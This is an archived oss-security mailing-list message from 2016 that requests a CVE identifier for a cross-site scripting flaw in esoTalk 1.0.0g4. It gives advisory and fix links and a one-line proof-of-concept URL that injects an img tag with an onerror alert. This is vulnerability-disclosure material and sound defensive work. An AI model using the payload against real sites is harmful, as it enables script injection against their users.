X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1272" "Sunday" "3" "January" "2016" "15:38:28" "+0200" "Henri Salo" "henri@nerv.fi" "<20160103133828.GA24661@tunkki>" "32" "[oss-security] CVE request: esoTalk 1.0.0g4 cross-site scripting vulnerability" nil nil nil "1" "2016010313:38:28" "[oss-security] CVE request: esoTalk 1.0.0g4 cross-site scripting vulnerability" (number mark "U       henri@nerv.f Jan  3   32/1272  " thread-indent "\"[oss-security] CVE request: esoTalk 1.0.0g4 cross-site scripting vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 8015 invoked by uid 550); 3 Jan 2016 13:38:43 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7996 invoked from network); 3 Jan 2016 13:38:42 -0000
X-Virus-Scanned: Debian amavisd-new at mango.nerv.fi
Date: Sun, 3 Jan 2016 15:38:28 +0200
From: Henri Salo <henri@nerv.fi>
To: cve-assign@mitre.org
Cc: oss-security@lists.openwall.com,
	Curesec Research Team <crt@curesec.com>
Message-ID: <20160103133828.GA24661@tunkki>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii; x-action=pgp-signed
User-Agent: Mutt/1.5.23 (2014-03-12)
Subject: [oss-security] CVE request: esoTalk 1.0.0g4 cross-site scripting vulnerability

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hi,

Please assign 2015 CVE identifier for esoTalk cross-site scripting
vulnerability, thanks.

Advisory: http://seclists.org/fulldisclosure/2015/Dec/112
Curesec blog: https://blog.curesec.com/article/blog/esoTalk-100g4-XSS-124.html
PoC: /conversations/a'";><img src=no onerror=alert(1)>?search=test
Fix: https://github.com/esotalk/esoTalk/commit/b938c39a83b55ecddc74b09d1116c37df1f2567e

- -- 
Henri Salo
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJWiSRUAAoJECet96ROqnV07PsQAJzRKRiQnLQ8cO6s0TAS5RVu
UWM0xDrF+nEitcT8yIF1IXp7eBR9IUD31HOb1aRL0bt0lK0eC8JwZkidf/5ejaUU
Mn8oTJWWfvHFe5dUAfuCEMnicd4YiJQ2s/+RA9kpo2MpV66mZvUxIvPqa4BdZeAQ
ew/QWFFUbNTGbAD+LDX0Q6SE46Pp/yn3acfkrEdSSR3aylMS9J+CAgP4cZmIyQYD
Itqqqgr4fl4SVLLP8VVcLmUyp0A6wGEeg1eqVf4Bn5r+ylfIpKcmMb2HgM+DX/oD
fIpjMvasn1fA9t/j4dZgZZwfC/cQM+l6ZYARaykSess/Pfj7nnGT4gKA42rZdfWj
36qFh1KJU4f6Z6VUYvXljKfddhhkyiHtfBdV38Rp1oRSX8PrFJkgolbrRSF/du6E
ROKeIKy6nT7ZUYLEVBTOGrrO4M8J+TMxsFJ4/1JUE8JvxK2xz2t4/PTuhDyeLFTP
oyUXl2xiXJDyMuPi9gQWP701h/gAi2QkjF5kpaK5Onn7EunP760i9/iD5KbgEd0f
ALSBIfzAZI3U2eWA5soOkJ99lsX0sxvzcF9pk9ufk+wz0nCfI+yv45I2A5l6c2oy
+ILTr5DGPtJU5hdd7zlpgepBKvc9rJmBDuNP4B7QhNYDREkpS9TVjjA//R/DfAT1
LVMjYYTCftN/5jS+ReLC
=Q5nX
-----END PGP SIGNATURE-----
